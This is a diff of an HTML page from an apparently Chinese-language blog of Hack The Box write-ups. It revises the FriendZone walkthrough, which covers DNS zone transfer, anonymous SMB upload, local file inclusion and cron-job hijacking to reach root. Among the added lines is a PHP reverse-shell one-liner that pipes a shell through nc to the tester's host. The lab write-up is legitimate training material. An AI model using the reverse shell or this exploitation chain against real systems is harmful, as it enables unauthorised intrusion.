@@ -104,6 +104,7 @@ document.addEventListener('DOMContentLoaded', function () {
 <li><a href="/htb/htb-linux/Valentine-Writeup">Valentine Writeup</a></li>
 <li><a href="/htb/htb-linux/Irked-Writeup">Irked Writeup</a></li>
 <li><a href="/htb/htb-linux/FriendZone-Writeup">FriendZone Writeup</a></li>
+<li><a href="/htb/htb-linux/Swagshop-Writeup">Swagshop Writeup</a></li>
 </ul>
 <h2 id="HTB-Windows">HTB Windows</h2>
 <ul>
@@ -184,11 +185,11 @@ function sidebar_toggle() {
   <h1 id="FriendZone-Writeup">FriendZone Writeup</h1>
 <p><img src="./0.png" alt=""></p>
 <h2 id="0x00-TODO">0x00 TODO</h2>
-<p><code>LinEnum.sh</code> 脚本补一个 <code>查询全局可写脚本文件</code>，对于个别提权场景有用。</p>
+<p><code>php://filter/covert.base64-encode/resource=&#123;papgename&#125;</code> 的操作为啥不能用？待了解。</p>
 <h2 id="0x01-信息收集">0x01 信息收集</h2>
 <h3 id="1、TCP-Scan">1、TCP Scan</h3>
 <pre class="language-bash" data-language="bash"><code class="language-bash">nmap -A -p- -oA nmap/tcp <span class="token number">10.10</span>.10.123</code></pre>
-<p>开放端口不少，可能是一个比较灵活的盒子。</p>
+<p>开放端口不少，可能是一个比较灵活的盒子。</p>
 <ul>
 <li><strong>21</strong>: vsftpd 3.0.3，版本较高</li>
 <li><strong>22</strong>: OpenSSH 7.6p1，版本较高</li>
@@ -196,14 +197,16 @@ function sidebar_toggle() {
 <li><strong>80</strong>: apache 2.4.29，版本较高，web 页面 title Friendxxx</li>
 <li><strong>139</strong>: samba 3.x ~ 4.x，可能是漏洞版本</li>
 <li><strong>443</strong>: apache 2.4.29，版本较高，web 页面 title 404</li>
-<li><strong>445</strong>: samba smbd 4.7.6，版本较高<br>
-<img src="./1.png" alt=""></li>
+<li><strong>445</strong>: samba smbd 4.7.6，版本较高</li>
 </ul>
+<p><img src="./1.png" alt=""></p>
 <h3 id="2、UDP-Scan">2、UDP Scan</h3>
 <pre class="language-bash" data-language="bash"><code class="language-bash">nmap -sU -A -p- -oA nmap/udp <span class="token number">10.10</span>.10.123</code></pre>
-<p>无结果。</p>
-<p><strong>共开放了 <code>tcp 21、22、53、80、139、443、445</code> 端口。</strong></p>
-<p><img src="./2.png" alt=""></p>
+<ul>
+<li><strong>53</strong>: ISC BIND 9.11.3-1ubuntu1.2，域名解析服务，可能涉及到域名</li>
+<li><strong>139</strong>: samba 3.x ~ 4.x，可能是漏洞版本。</li>
+</ul>
+<p><strong>共开放了 <code>tcp 21、22、53、80、139、443、445</code>、<code>udp 53、139</code> 端口。</strong></p>
 <h2 id="0x02-枚举">0x02 枚举</h2>
 <p>我去啊，这些个端口的服务查了一遍下来没有公开漏洞，版本都比较高，直接漏洞打看似不太可能。</p>
 <h3 id="1、Port-21、22">1、Port 21、22</h3>
@@ -212,7 +215,7 @@ FTP 尝试匿名登录，登录失败。</p>
 <pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">ftp</span> <span class="token number">10.10</span>.10.123
 Name:       anonymous
 Password:   <span class="token punctuation">(</span>blank<span class="token punctuation">)</span></code></pre>
-<p><img src="./2.1.png" alt=""><br>
+<p><img src="./2.png" alt=""><br>
 没啥其他内容，放着。</p>
 <h3 id="2、Port-53">2、Port 53</h3>
 <p>没找到公开漏洞。<br>
@@ -229,9 +232,9 @@ smbclient //10.10.10.123</code></pre>
 <p><img src="./3.png" alt=""><br>
 <img src="./4.png" alt=""></p>
 <h3 id="4、Port-80、443">4、Port 80、443</h3>
-<p>没找到公开漏洞，打开主页 <code>http://10.10.10.123</code>，是一个空白页，<code>dirbuster</code> 跑一下目录找到个 <code>/wordpress</code> 啥都没有。</p>
-<p><img src="./4.1.png" alt=""><br>
-好像走到死胡同，没有找到其他突破口，这时候要回顾之前收集的信息看有没有遗漏，之前收集的线索有没有没用上或者还不知道怎么用的。</p>
+<p>没找到公开漏洞。<br>
+打开主页 <code>http://10.10.10.123</code>，是一个空白页，<code>dirbuster</code> 跑一下目录找到个 <code>/wordpress</code> 啥都没有。</p>
+<p>好像走到死胡同，没有找到其他突破口，这时候要<strong>回顾之前收集的信息看有没有遗漏、之前收集的线索有没有没用上、或者还不知道怎么用的</strong>。</p>
 <h4 id="4-1、发现路由配置">4.1、发现路由配置</h4>
 <p>回顾 nmap 扫描结果里 <code>80</code> 和 <code>443</code> 有不同页面，直接打开 <code>https://10.10.10.123</code> 是 404，想到<strong>可能存在特定路由配置，需要域名才能访问</strong>。<br>
 应该是什么域名呢？翻一遍前面的信息，找找是否有提示。</p>
@@ -240,10 +243,12 @@ smbclient //10.10.10.123</code></pre>
 <li>根据 <code>nmap 443</code> 扫描结果 <code>ssl-cert: commonName=friendzone.red</code>，得到域名2 <code>friendzone.red</code>。</li>
 </ul>
 <p>添加 <code>/etc/hosts</code> 本地解析，浏览器打开 <code>https://friendzoneportal.red，https://friendzone.red</code>，果然是另一个页面。</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">vi</span> /etc/hosts
+<span class="token number">10.10</span>.10.123    friendzoneportal.red friendzone.red</code></pre>
 <p><img src="./5.png" alt=""><br>
 <img src="./6.png" alt=""></p>
 <blockquote>
-<p><code>https://friendzone.red</code> 主页下注释了神秘路径 <code>/js/js</code>，打开没啥内容，不知道有啥用。</p>
+<p>查看页面源代码，<code>https://friendzone.red</code> 主页下注释了神秘路径 <code>/js/js</code>，打开没啥内容，不知道有啥用。</p>
 <p><img src="./7.png" alt=""></p>
 </blockquote>
 <p>联系之前扫到的 53 端口 BIND 服务，靶机可能自身是一个 <code>DNS Server</code>，可能还有其他的子域名，先从靶机地址捞一波解析记录，反查域名，得到许多子域。</p>
@@ -286,7 +291,7 @@ vpn.friendzoneportal.red        <span class="token comment"># 404</span></code><
 <li><code>friendzoneportal.red</code> 之前看了没东西，排除。</li>
 <li><code>friendzone.red</code> 之前看了没东西，排除。</li>
 <li><code>admin.friendzoneportal.red</code> 页面登录默认页面 <code>login.php</code> 无论传什么参数返回都一样，功能欠缺，先放着。</li>
-<li><code>administrator1.friendzone.red</code> 登录页，提示传参 <code>image_id=a.jpg&amp;pagename=timestamp</code>，有搞头。</li>
+<li><code>administrator1.friendzone.red</code> 登录页，有搞头。</li>
 <li><code>uploads.friendzone.red</code> 上传页，有搞头。</li>
 </ul>
 <p>着重看后面两域名。</p>
@@ -298,27 +303,53 @@ vpn.friendzoneportal.red        <span class="token comment"># 404</span></code><
 <p>哦豁，上传点，加前面的传参解析，离成功不远了。</p>
 <p><img src="./9.4.png" alt=""></p>
 <h2 id="0x03-立足点">0x03 立足点</h2>
-<p>根据提示传参 <code>https://administrator1.friendzone.red?image_id=a.jpg&amp;pagename=timestamp</code>，拿到图片路径 <code>/images</code>，发现有还有图片 <code>b.jpg</code>，修改 <code>image_id=b.jpg</code>，可见图片和下方内容随之变化。</p>
+<p>根据页面提示传参 <code>https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&amp;pagename=timestamp</code>，拿到图片路径 <code>/images</code>，发现有还有图片 <code>b.jpg</code>，修改 <code>image_id=b.jpg</code>，可见图片和下方内容随之变化。</p>
+<p><img src="./9.3.png" alt=""></p>
 <p>根据 <code>参数名和现象</code>，初步判定：</p>
 <ul>
-<li>image_id 指定图片路径，</li>
-<li>timestamp 指定页面文件，猜测与文件包含有关</li>
+<li><strong>image_id</strong> 指定图片路径。</li>
+<li><strong>timestamp</strong> 指定页面文件，猜测与文件包含有关，像后端自动给参数加上后缀 <code>.php</code>。</li>
 </ul>
-<p><img src="./9.3.png" alt=""><br>
-再来看上传页 <code>https://uploads.friendzone.red</code>，尝试上传 <code>.php</code> <code>.jpg</code>，首先没有看到返回文件地址，其次在 <code>/images</code> 下也没有留存，尝试过 <code>文件名/带后缀/不带后缀/返回的时间戳</code> 花式组合分别放在 image_id pagename 都没用。</p>
-<p><img src="./9.5.png" alt=""></p>
-<p>本地文件包含。</p>
+<p>验证猜想，访问 <code>https://administrator1.friendzone.red/timestamp.php</code>，得到以下页面，内容正是上方页面里左下角部分，说明 <code>pagename</code> 参数存在本地文件包含，所以只要想办法上传脚本令其包含即可。</p>
+<p><img src="./9.6.png" alt=""></p>
+<p>在上传页 <code>https://uploads.friendzone.red</code> 尝试上传 <code>.php</code> <code>.jpg</code>，得到成功字样和一个时间戳。</p>
+<pre class="language-php" data-language="php"><code class="language-php">$ vi info.php
+<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>  # 上传的文件</code></pre>
+<p><img src="./9.5.png" alt=""><br>
+但是没有返回文件地址，<code>/images</code> 也没有留存文件，那上传到底成没成功？还是要枚举一番？<br>
+尝试过 <code>文件名/带后缀/不带后缀/返回的时间戳</code> 花式组合分别放在 <code>image_id</code> <code>pagename</code> 均没用，前端就是看不到内容。难道根本没有上传成功？</p>
+<blockquote>
+<p>当存在文件包含时，往往只能看见执行后的文件，如果能知道脚本里写了什么，是不是就能很快判定这里上传逻辑了呢。<br>
+那么要怎么获得执行前的脚本文件？据说有这么个姿势，会返回相应页面的 base64，解码可得页面内容。</p>
+<pre class="language-text" data-language="text"><code class="language-text">https:&#x2F;&#x2F;administrator1.friendzone.red&#x2F;dashboard.php?image_id&#x3D;a.jpg&amp;pagename&#x3D;php:&#x2F;&#x2F;filter&#x2F;covert.base64-encode&#x2F;resource&#x3D;php:&#x2F;&#x2F;filter&#x2F;covert.base64-encode&#x2F;resource&#x3D;login</code></pre>
+<p>但是实操无效，原因未知。</p>
+</blockquote>
+<p>假设这里没有上传成功怎么办，是否还有其他上传点？那几个域名再检查了一遍均无果，最后想到 <strong>smb 还有一个可写文件夹</strong>。</p>
+<p>上传 <code>info.php</code>，尝试包含。</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">smbclient //10.10.10.123/Development
+<span class="token operator">></span> put info.php</code></pre>
+<p><img src="./9.7.png" alt=""><br>
+根据文件夹备注，<code>/Development</code> 文件夹在服务器对应的地址是 <code>/etc/Development</code>。</p>
+<p><img src="./12.4.png" alt=""><br>
+访问 <code>https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&amp;pagename=/etc/Development/info</code> 查看是否包含了我们的 <code>info.php</code>，发现成功包含。</p>
+<p><img src="./9.8.png" alt=""><br>
+最后上传反弹 shell 脚本，访问页面令后端包含，在 kali getshell。</p>
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&amp;1|nc 10.10.14.7 4444 >/tmp/f'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre>
 <p><img src="./12.png" alt=""></p>
 <h2 id="0x04-提权">0x04 提权</h2>
+<p>上线了先检查配置。</p>
 <h3 id="1、SUID">1、SUID</h3>
-<p>suid exim4 4.90.1 不行。</p>
+<p>找到一个 <code>exim4 4.90.1</code> 是漏洞版本，试过 exp 不行。</p>
 <p><img src="./12.1.png" alt=""><br>
 <img src="./12.2.png" alt=""></p>
 <h3 id="2、Sudo">2、Sudo</h3>
-<p>friend - sudo su（/home/friend/.sudo_as_admin_successful）不行。</p>
-<p><img src="./14.png" alt=""></p>
+<p>在 <code>/var/www/</code> 找到一个 mysql 配置文件，是 <code>friend</code> 用户密码，尝试 <code>su friend</code> 成功切换用户。</p>
+<p><img src="./14.png" alt=""><br>
+在 <code>/home/friend</code> 找到 <code>user.txt</code>，是普通 flag，根据经验用 <code>ls -la</code> 看了一下发现隐藏文件 <code>.sudo_as_admin_successful</code>，似乎直接可以执行 root 命令？<br>
+然鹅 <code>sudo su</code> 失败。</p>
+<p><img src="./12.3.png" alt=""></p>
 <h3 id="3、Crontab">3、Crontab</h3>
-<p>pspy 监控定时任务，发现执行了一个 <code>python</code> 脚本。</p>
+<p>传一个 <code>pspy64s</code> 监控定时任务，发现执行了一个 <code>python</code> 脚本。</p>
 <p><img src="./13.png" alt=""><br>
 但是查看权限发现不可写，再查看下内容，主要代码逻辑是注释掉的。</p>
 <p><img src="./15.png" alt=""><br>
@@ -330,9 +361,14 @@ vpn.friendzoneportal.red        <span class="token comment"># 404</span></code><
 本地开启监听 <code>nc -lnvp 4445</code>，等待定时任务启动，获得 root shell。</p>
 <p><img src="./18.png" alt=""></p>
 <h2 id="0x05-攻击节点">0x05 攻击节点</h2>
+<h4 id="信息收集-80-53-DNS-域传输漏洞获得子域名-445-samba-匿名登录-文件写入-443-本地文件包含-www-data-crontab-定时任务-劫持-os-py-root">信息收集 -&gt; 80/53.DNS 域传输漏洞获得子域名 -&gt; 445.samba 匿名登录 + 文件写入 -&gt; 443.本地文件包含(www-data) -&gt; crontab 定时任务+劫持 <a target="_blank" rel="noopener" href="http://os.py">os.py</a>(root)</h4>
 <h2 id="0x06-学到什么">0x06 学到什么</h2>
-<h4 id="1、443-的证书信息要多看，很有用。">1、443 的证书信息要多看，很有用。</h4>
-<h4 id="2、遇到-web-应用多留意域名路由配置。">2、遇到 web 应用多留意域名路由配置。</h4>
+<h4 id="1、443-的证书信息要多看，可能包含比如域名信息。">1、443 的证书信息要多看，可能包含比如域名信息。</h4>
+<h4 id="2、web-应用多留意域名路由配置，考虑域传输漏洞。">2、web 应用多留意域名路由配置，考虑域传输漏洞。</h4>
+<h4 id="3、ftp、smb-先尝试是否允许匿名登录。">3、ftp、smb 先尝试是否允许匿名登录。</h4>
+<h4 id="4、samba-文件夹备注要多留意，否则错过潜在的关键信息。">4、samba 文件夹备注要多留意，否则错过潜在的关键信息。</h4>
+<h4 id="5、文件的上传可以有多种方式，不必死磕一处，多回顾之前收集的信息，灵活应对。">5、文件的上传可以有多种方式，不必死磕一处，多回顾之前收集的信息，灵活应对。</h4>
+<h4 id="6、遇到-root-执行文件无可写权限，尝试劫持其引用的外部文件，或许是可写的。">6、遇到 root 执行文件无可写权限，尝试劫持其引用的外部文件，或许是可写的。</h4>
 
 </div>
 
